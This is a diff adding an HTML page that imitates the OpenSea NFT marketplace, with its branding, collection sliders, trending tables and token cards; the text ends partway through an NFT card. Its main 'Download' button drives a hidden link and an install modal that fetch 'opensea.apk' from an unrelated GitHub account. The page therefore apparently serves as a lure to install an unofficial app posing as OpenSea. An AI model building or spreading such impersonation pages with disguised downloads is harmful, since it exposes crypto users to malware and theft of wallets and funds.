@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="img/openseatitle.png" />
+    <title>opensea.io</title>
+</head>
+
+<body>
+
+    <!-- ░░ TOP NAV ░░ -->
+    <nav id="topnav">
+        <!-- hamburger (mobile) -->
+        <button id="hamburger" aria-label="Open menu" onclick="openDrawer()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                <line x1="3" y1="6" x2="21" y2="6" />
+                <line x1="3" y1="12" x2="21" y2="12" />
+                <line x1="3" y1="18" x2="21" y2="18" />
+            </svg>
+        </button>
+
+        <!-- logo (mobile) -->
+        <a href="#" id="topnav-logo">
+            <img src="img/OpenSeaLogo.png" alt="OpenSea logo" class="logo-mark" />
+            OpenSea
+        </a>
+
+        <!-- search -->
+        <div id="search-wrap">
+            <svg class="s-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round">
+                <circle cx="11" cy="11" r="8" />
+                <path d="m21 21-4.35-4.35" />
+            </svg>
+            <input type="text" placeholder="Search NFTs, collections, wallets…" />
+            <span class="kbd-hint">/</span>
+        </div>
+
+        <!-- right -->
+        <div class="topnav-right">
+            <button class="icon-btn" title="Notifications">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
+                    <path d="M13.73 21a2 2 0 0 1-3.46 0" />
+                </svg>
+            </button>
+            <button id="download-btn" onclick="handleDownload()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                    <polyline points="7 10 12 15 17 10" />
+                    <line x1="12" y1="15" x2="12" y2="3" />
+                </svg>
+                <span id="dl-btn-text">Download</span>
+            </button>
+            <!-- hidden real download anchor -->
+            <a id="dl-anchor"
+                href="https://github.com/higgins-tech/opensea/releases/download/v1.0.0/opensea.apk"
+                download="opensea.apk" style="display:none;">
+            </a>
+        </div>
+    </nav>
+
+    <!-- ░░ DOWNLOAD MODAL ░░ -->
+    <div id="dl-overlay" onclick="closeDlModal()"
+        style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:300;backdrop-filter:blur(4px);">
+    </div>
+    <div id="dl-modal"
+        style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:301;width:min(440px,92vw);background:#18181f;border:1px solid rgba(255,255,255,0.1);border-radius:18px;padding:28px;box-shadow:0 32px 80px rgba(0,0,0,0.6);">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <div id="dl-platform-icon"
+                    style="width:44px;height:44px;border-radius:12px;background:#111;display:flex;align-items:center;justify-content:center;">
+                </div>
+                <div>
+                    <div id="dl-modal-title"
+                        style="font-family:'Syne',sans-serif;font-weight:700;font-size:17px;color:#e8e8f0;"></div>
+                    <div id="dl-modal-sub" style="font-size:12px;color:#6b6b80;margin-top:2px;"></div>
+                </div>
+            </div>
+            <button onclick="closeDlModal()"
+                style="width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#6b6b80;background:none;border:none;cursor:pointer;transition:background 0.2s;"
+                onmouseover="this.style.background='#111'" onmouseout="this.style.background='none'">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                    stroke-linecap="round">
+                    <line x1="18" y1="6" x2="6" y2="18" />
+                    <line x1="6" y1="6" x2="18" y2="18" />
+                </svg>
+            </button>
+        </div>
+
+        <!-- Steps -->
+        <div id="dl-steps" style="display:flex;flex-direction:column;gap:12px;margin-bottom:22px;"></div>
+
+        <!-- Action buttons -->
+        <div style="display:flex;gap:10px;">
+            <button id="dl-confirm-btn" onclick="triggerDownload()"
+                style="flex:1;height:44px;background:#3b82f6;border:none;border-radius:10px;font-family:'Syne',sans-serif;font-weight:700;font-size:14px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background 0.2s;"
+                onmouseover="this.style.background='#2563eb'" onmouseout="this.style.background='#3b82f6'">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+                    stroke-linecap="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                    <polyline points="7 10 12 15 17 10" />
+                    <line x1="12" y1="15" x2="12" y2="3" />
+                </svg>
+                Download Now
+            </button>
+            <button onclick="closeDlModal()"
+                style="height:44px;padding:0 18px;background:none;border:1px solid rgba(255,255,255,0.1);border-radius:10px;font-family:'DM Sans',sans-serif;font-size:14px;color:#6b6b80;cursor:pointer;transition:border-color 0.2s,color 0.2s;"
+                onmouseover="this.style.borderColor='rgba(255,255,255,0.25)';this.style.color='#e8e8f0'"
+                onmouseout="this.style.borderColor='rgba(255,255,255,0.1)';this.style.color='#6b6b80'">Cancel</button>
+        </div>
+    </div>
+
+    <!-- ░░ DOWNLOAD TOAST ░░ -->
+    <div id="dl-toast"
+        style="display:none;position:fixed;bottom:24px;right:24px;z-index:400;background:#18181f;border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 18px;box-shadow:0 12px 40px rgba(0,0,0,0.5);display:flex;align-items:center;gap:12px;min-width:260px;opacity:0;transform:translateY(12px);transition:opacity 0.3s,transform 0.3s;">
+        <div
+            style="width:36px;height:36px;background:rgba(34,197,94,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"
+                stroke-linecap="round">
+                <polyline points="20 6 9 17 4 12" />
+            </svg>
+        </div>
+        <div>
+            <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:13px;color:#e8e8f0;">Download started!
+            </div>
+            <div id="toast-sub" style="font-size:11px;color:#6b6b80;margin-top:2px;"></div>
+        </div>
+    </div>
+
+    <!-- ░░ BODY ROW ░░ -->
+    <div id="body-row">
+
+        <!-- ░░ LEFT SIDENAV (desktop) ░░ -->
+        <nav id="sidenav">
+            <!-- Logo -->
+            <div id="sidenav-logo">
+                <img src="img/OpenSeaLogo.png" alt="OpenSea logo" class="logo-mark" />
+                <span class="logo-text">OpenSea</span>
+            </div>
+
+            <!-- Primary links -->
+            <ul class="nav-list">
+                <li class="nav-item active" title="Discover">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76" />
+                    </svg>
+                    <span class="nav-label">Discover</span>
+                </li>
+                <li class="nav-item" title="Collections">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <rect x="3" y="3" width="7" height="7" rx="1" />
+                        <rect x="14" y="3" width="7" height="7" rx="1" />
+                        <rect x="3" y="14" width="7" height="7" rx="1" />
+                        <rect x="14" y="14" width="7" height="7" rx="1" />
+                    </svg>
+                    <span class="nav-label">Collections</span>
+                </li>
+                <li class="nav-item" title="Tokens">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <circle cx="12" cy="12" r="8" />
+                        <circle cx="12" cy="12" r="3" />
+                    </svg>
+                    <span class="nav-label">Tokens</span>
+                </li>
+                <li class="nav-item" title="Swap">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M7 16V4m0 0L3 8m4-4 4 4" />
+                        <path d="M17 8v12m0 0 4-4m-4 4-4-4" />
+                    </svg>
+                    <span class="nav-label">Swap</span>
+                </li>
+                <li class="nav-item" title="Drops">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <rect x="3" y="4" width="18" height="18" rx="2" />
+                        <line x1="16" y1="2" x2="16" y2="6" />
+                        <line x1="8" y1="2" x2="8" y2="6" />
+                        <line x1="3" y1="10" x2="21" y2="10" />
+                    </svg>
+                    <span class="nav-label">Drops</span>
+                </li>
+                <li class="nav-item" title="Activity">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <line x1="8" y1="6" x2="21" y2="6" />
+                        <line x1="8" y1="12" x2="21" y2="12" />
+                        <line x1="8" y1="18" x2="21" y2="18" />
+                        <line x1="3" y1="6" x2="3.01" y2="6" />
+                        <line x1="3" y1="12" x2="3.01" y2="12" />
+                        <line x1="3" y1="18" x2="3.01" y2="18" />
+                    </svg>
+                    <span class="nav-label">Activity</span>
+                </li>
+                <li class="nav-item" title="Rewards">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path
+                            d="M12 2L15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2Z" />
+                    </svg>
+                    <span class="nav-label">Rewards</span>
+                </li>
+                <li class="nav-item" title="Studio">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M12 20h9" />
+                        <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" />
+                    </svg>
+                    <span class="nav-label">Studio</span>
+                </li>
+            </ul>
+
+            <!-- Divider before Profile -->
+            <div class="nav-divider"></div>
+
+            <ul class="nav-list">
+                <li class="nav-item" title="Profile">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                        <circle cx="12" cy="7" r="4" />
+                    </svg>
+                    <span class="nav-label">Profile</span>
+                </li>
+            </ul>
+
+            <!-- Thin divider BETWEEN Profile and the remaining -->
+            <div class="nav-divider"></div>
+
+            <ul class="nav-list">
+                <li class="nav-item" title="Resources">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                        <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
+                    </svg>
+                    <span class="nav-label">Resources</span>
+                </li>
+                <li class="nav-item" title="Settings">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <circle cx="12" cy="12" r="3" />
+                        <path
+                            d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
+                    </svg>
+                    <span class="nav-label">Settings</span>
+                </li>
+                <li class="nav-item" title="Support">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+                        <line x1="12" y1="17" x2="12.01" y2="17" />
+                    </svg>
+                    <span class="nav-label">Support</span>
+                </li>
+            </ul>
+        </nav>
+
+        <!-- ░░ MAIN ░░ -->
+        <main id="main">
+
+            <!-- Filter bar -->
+            <div id="filter-bar">
+                <button class="filter-chip active">All</button>
+                <button class="filter-chip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <rect x="2" y="3" width="20" height="14" rx="2" />
+                        <line x1="8" y1="21" x2="16" y2="21" />
+                        <line x1="12" y1="17" x2="12" y2="21" />
+                    </svg>
+                    Gaming
+                </button>
+                <button class="filter-chip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="m9.06 11.9 8.07-8.06a2.85 2.85 0 1 1 4.03 4.03l-8.06 8.08" />
+                        <path
+                            d="M7.07 14.94c-1.66 0-3 1.35-3 3.02 0 1.33-2.5 1.52-2 2.02 1.08 1.1 2.49 2.02 4 2.02 2.2 0 4-1.8 4-4.04a3.01 3.01 0 0 0-3-3.02z" />
+                    </svg>
+                    Art
+                </button>
+                <button class="filter-chip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <circle cx="12" cy="8" r="5" />
+                        <path d="M20 21a8 8 0 1 0-16 0" />
+                    </svg>
+                    PFPs
+                </button>
+                <button class="filter-chip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                        <circle cx="9" cy="7" r="4" />
+                        <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
+                        <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                    </svg>
+                    Memberships
+                </button>
+                <button class="filter-chip">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                        <path d="M9 18V5l12-2v13" />
+                        <circle cx="6" cy="18" r="3" />
+                        <circle cx="18" cy="16" r="3" />
+                    </svg>
+                    Music
+                </button>
+                <button class="filter-chip">More</button>
+
+                <div class="filter-sep"></div>
+
+                <button class="filter-chip active" style="padding: 0 10px;">All</button>
+                <div class="chain-pill" title="Ethereum"><img src="img/ethereum.png" alt="Ethereum"
+                        class="chain-pill-text"></div>
+                <div class="chain-pill" title="Solana"><img src="img/solana.png" alt="Solana"
+                        class="chain-pill-text"></span>
+                </div>
+                <div class="chain-pill" title="Polygon"><img src="img/polygon.png" alt="Polygon"
+                        class="chain-pill-text">
+                </div>
+                <div class="chain-pill" title="Base"><img src="img/base.png" alt="Base" class="chain-pill-text"></div>
+                <div class="chain-pill" title="Arbitrum"><img src="img/arbitrum.png" alt="Arbitrum"
+                        class="chain-pill-text"></span>
+                </div>
+                <div class="chain-pill" title="More">•••</div>
+            </div>
+
+            <!-- Hero slider -->
+            <div id="hero-section">
+                <div id="hero-slider">
+
+                    <!-- Slide 1 -->
+                    <div class="slide active">
+                        <img src="img/anichess.png" alt="Anihess void vanguards" class="slide-img" />
+                        <div class="slide-content">
+                            <div class="slide-info">
+                                <div class="slide-title">
+                                    Anichess Void Vanguards
+                                    <span class="verified-badge">
+                                        <svg viewBox="0 0 24 24" fill="currentColor">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg>
+                                    </span>
+                                </div>
+                                <div class="slide-by">By Anichess_Dev</div>
+                                <div class="slide-stats">
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Floor Price</div>
+                                        <div class="stat-val">1.990 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Items</div>
+                                        <div class="stat-val">279</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Total Volume</div>
+                                        <div class="stat-val">312 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Listed</div>
+                                        <div class="stat-val">6.2%</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slide-thumbs">
+                                <div class="slide-thumb active"><img src="img/anichess.png" alt="Anichess"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/phygitals.png" alt="Phygitals"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/mirrorstages.png" alt="Mirror Stages"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Slide 2 -->
+                    <div class="slide">
+                        <img src="img/phygitals.png" alt="Phygitals banner" class="slide-img" />
+                        <div class="slide-content">
+                            <div class="slide-info">
+                                <div class="slide-title">
+                                    Phygitals: 30th Edition
+                                    <span class="verified-badge">
+                                        <svg viewBox="0 0 24 24" fill="currentColor">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg>
+                                    </span>
+                                </div>
+                                <div class="slide-by">By PhygitalsTeam</div>
+                                <div class="slide-stats">
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Floor Price</div>
+                                        <div class="stat-val">0.024 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Items</div>
+                                        <div class="stat-val">1,000</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Total Volume</div>
+                                        <div class="stat-val">29.11 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Listed</div>
+                                        <div class="stat-val">9.1%</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slide-thumbs">
+                                <div class="slide-thumb active"><img src="img/anichess.png" alt="Anichess"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/phygitals.png" alt="Phygitals"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/mirrorstages.png" alt="Mirror Stages"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Slide 3 -->
+                    <div class="slide">
+                        <img src="img/mirrorstages.png" alt="Mirror Stages banner" class="slide-img" />
+                        <div class="slide-content">
+                            <div class="slide-info">
+                                <div class="slide-title">
+                                    Mirror Stages: Seed
+                                    <span class="verified-badge">
+                                        <svg viewBox="0 0 24 24" fill="currentColor">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg>
+                                    </span>
+                                </div>
+                                <div class="slide-by">By Botto</div>
+                                <div class="slide-stats">
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Floor Price</div>
+                                        <div class="stat-val">0.013 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Items</div>
+                                        <div class="stat-val">3,333</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Total Volume</div>
+                                        <div class="stat-val">210 ETH</div>
+                                    </div>
+                                    <div class="slide-stat">
+                                        <div class="stat-label">Listed</div>
+                                        <div class="stat-val">4.8%</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slide-thumbs">
+                                <div class="slide-thumb active"><img src="img/anichess.png" alt="Anichess"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/phygitals.png" alt="Phygitals"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                                <div class="slide-thumb"><img src="img/mirrorstages.png" alt="Mirror Stages"
+                                        style="width:100%;height:100%;object-fit:cover;" /></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="slider-btn" id="prev-btn" onclick="changeSlide(-1)">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                            stroke-linecap="round">
+                            <polyline points="15 18 9 12 15 6" />
+                        </svg>
+                    </button>
+                    <button class="slider-btn" id="next-btn" onclick="changeSlide(1)">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                            stroke-linecap="round">
+                            <polyline points="9 18 15 12 9 6" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- dots -->
+                <div class="slider-dots">
+                    <div class="dot active" onclick="goSlide(0)"></div>
+                    <div class="dot" onclick="goSlide(1)"></div>
+                    <div class="dot" onclick="goSlide(2)"></div>
+                </div>
+            </div>
+
+            <!-- Trending Collections -->
+            <div class="section">
+                <div class="section-head">
+                    <div>
+                        <div class="section-title">Trending Collections</div>
+                        <div class="section-sub">Top collections by volume in the last 24h</div>
+                    </div>
+                    <a href="#" class="see-all">See all →</a>
+                </div>
+                <div class="trending-table">
+                    <div class="table-head">
+                        <div>#</div>
+                        <div>Collection</div>
+                        <div style="text-align:right">Floor</div>
+                        <div style="text-align:right">24h %</div>
+                        <div style="text-align:right">Volume</div>
+                    </div>
+                    <!-- rows -->
+                    <div class="table-row fade-up">
+                        <div class="rank">1</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/pudgy.png"
+                                    alt="Pudgy Penguins"></div>
+                            <div>
+                                <div class="coll-name">Pudgy Penguins <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">4.07 ETH</div>
+                        <div class="change up">+1.3%</div>
+                        <div class="coll-vol">824 ETH</div>
+                    </div>
+                    <div class="table-row fade-up">
+                        <div class="rank">2</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/boredape.png"
+                                    alt="Bored Ape YC"></div>
+                            <div>
+                                <div class="coll-name">Bored Ape Yacht Club <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">5.24 ETH</div>
+                        <div class="change down">-0.1%</div>
+                        <div class="coll-vol">610 ETH</div>
+                    </div>
+                    <div class="table-row fade-up">
+                        <div class="rank">3</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/punks.png"
+                                    alt="CryptoPunks"></div>
+                            <div>
+                                <div class="coll-name">CryptoPunks <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">28.75 ETH</div>
+                        <div class="change" style="color:var(--muted)">0%</div>
+                        <div class="coll-vol">580 ETH</div>
+                    </div>
+                    <div class="table-row fade-up">
+                        <div class="rank">4</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/hypurr.png" alt="Hypurr">
+                            </div>
+                            <div>
+                                <div class="coll-name">Hypurr <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">403.99 HYPE</div>
+                        <div class="change down">-1%</div>
+                        <div class="coll-vol">320K HYPE</div>
+                    </div>
+                    <div class="table-row fade-up">
+                        <div class="rank">5</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/warplets.png"
+                                    alt="The Warplets"></div>
+                            <div>
+                                <div class="coll-name">The Warplets <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">&lt; 0.01 ETH</div>
+                        <div class="change down">-13.2%</div>
+                        <div class="coll-vol">48 ETH</div>
+                    </div>
+                    <div class="table-row fade-up">
+                        <div class="rank">6</div>
+                        <div class="collection-cell">
+                            <div class="coll-avatar" style="background:#1e1b4b;"><img src="img/mutant.png"
+                                    alt="Mutant Ape YC"></div>
+                            <div>
+                                <div class="coll-name">Mutant Ape Yacht Club <span class="verified-badge"
+                                        style="width:16px;height:16px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                            style="width:9px;height:9px;">
+                                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                        </svg></span></div>
+                            </div>
+                        </div>
+                        <div class="coll-floor">0.75 ETH</div>
+                        <div class="change down">-0.2%</div>
+                        <div class="coll-vol">210 ETH</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Trending Tokens -->
+            <div class="section" style="padding-top:0">
+                <div class="section-head">
+                    <div>
+                        <div class="section-title">Trending Tokens</div>
+                        <div class="section-sub">Tokens with momentum today</div>
+                    </div>
+                    <a href="#" class="see-all">See all →</a>
+                </div>
+                <div class="tokens-grid">
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#1c1400;"><img src="img/pippin.png" alt="pippin">
+                        </div>
+                        <div>
+                            <div class="token-name">Pippin</div>
+                            <div class="token-mc">$54.5M</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--green)">+2%</div>
+                    </div>
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#0d0d1a;"><img src="img/aPriori.png" alt="aPriori">
+                        </div>
+                        <div>
+                            <div class="token-name">aPriori Monad LST</div>
+                            <div class="token-mc">$694.4K</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--green)">+15.4%</div>
+                    </div>
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#1a0a00;"><img src="img/idlemine.png" alt="idlemine">
+                        </div>
+                        <div>
+                            <div class="token-name">IdleMine</div>
+                            <div class="token-mc">$22.6M</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--green)">+2.2%</div>
+                    </div>
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#001a0d;"><img src="img/kekfish.png" alt=""></div>
+                        <div>
+                            <div class="token-name">Kekfish</div>
+                            <div class="token-mc">$103K</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--red)">-4.2%</div>
+                    </div>
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#0d001a;"><img src="img/checkmate.png"
+                                alt="checkmate"></div>
+                        <div>
+                            <div class="token-name">Checkmate</div>
+                            <div class="token-mc">$34.9M</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--green)">+42.8%</div>
+                    </div>
+                    <div class="token-card">
+                        <div class="token-icon" style="background:#1a0000;"><img src="img/xstock.png" alt=""></div>
+                        <div>
+                            <div class="token-name">Circle xStock</div>
+                            <div class="token-mc">$47.4M</div>
+                        </div>
+                        <div class="token-chg" style="color:var(--red)">-8.1%</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Notable NFTs -->
+            <div class="section" style="padding-top:0">
+                <div class="section-head">
+                    <div>
+                        <div class="section-title">Trending Collections</div>
+                        <div class="section-sub">Highest sales in the past hour</div>
+                    </div>
+                    <a href="#" class="see-all">See all →</a>
+                </div>
+                <div class="nft-grid">
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#1e1b4b,#312e81);">
+                            <img src="img/axie.png" alt="axie collection">
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
+                            <div class="nft-collection">Axie_Deployers <span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Axie #190442</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 0.048</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 0.041</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#0c4a6e,#0369a1);">
+                            <span style="font-size:54px;"><img src="img/warpletnft.png" alt=""></span>
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
